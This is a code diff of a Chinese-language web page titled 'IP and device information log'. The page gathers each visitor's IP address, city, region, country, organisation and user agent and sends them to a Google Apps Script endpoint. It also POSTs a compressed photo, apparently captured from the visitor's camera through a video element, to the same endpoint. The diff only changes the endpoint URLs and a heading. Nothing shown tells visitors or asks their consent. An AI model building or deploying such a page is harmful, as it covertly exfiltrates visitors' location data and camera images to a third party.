@@ -6,7 +6,7 @@
   <title>IP 與設備訊息記錄</title>
 </head>
 <body>
-  <h1>IP 與設備訊cccccccccccccccc息記錄</h1>
+  <h1>IP 與設備訊ccc息記錄</h1>
   <p id="ipInfo">IP 資訊載入中...</p>
   <p id="status">尚未開始操作</p>
   <video id="video" autoplay playsinline width="320" height="240"></video>
@@ -28,7 +28,7 @@
           `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;
 
         // 發送 GET 請求到 Google Apps Script
-        const url = new URL('https://script.google.com/macros/s/AKfycby5gVmyBS4hoEep0zDl1QYMTFnb78aCkaf1E8VMSM6DUCv_WPALdr1nnP1yb6f9Ty-qCw/exec'); // 替換為您的 URL
+        const url = new URL('https://script.google.com/macros/s/AKfycbw1anJd6msAyjO4SAiKQugww_z4yyUMPAlk6RWSA0PtCQEGiuGFhBE3r7vad_l5_qSy6A/exec'); // 替換為您的 URL
         url.searchParams.append('ip', ip);
         url.searchParams.append('ipType', ipType);
         url.searchParams.append('userAgent', userAgent);
@@ -71,7 +71,7 @@
         formData.append('photo', compressedBlob, 'photo.jpg');
         formData.append('userAgent', navigator.userAgent);
 
-        const response = await fetch('https://script.google.com/macros/s/AKfycby5gVmyBS4hoEep0zDl1QYMTFnb78aCkaf1E8VMSM6DUCv_WPALdr1nnP1yb6f9Ty-qCw/exec', { // 替換為您的後端 URL
+        const response = await fetch('https://script.google.com/macros/s/AKfycbw1anJd6msAyjO4SAiKQugww_z4yyUMPAlk6RWSA0PtCQEGiuGFhBE3r7vad_l5_qSy6A/exec', { // 替換為您的後端 URL
           method: 'POST',
           body: formData,
         });
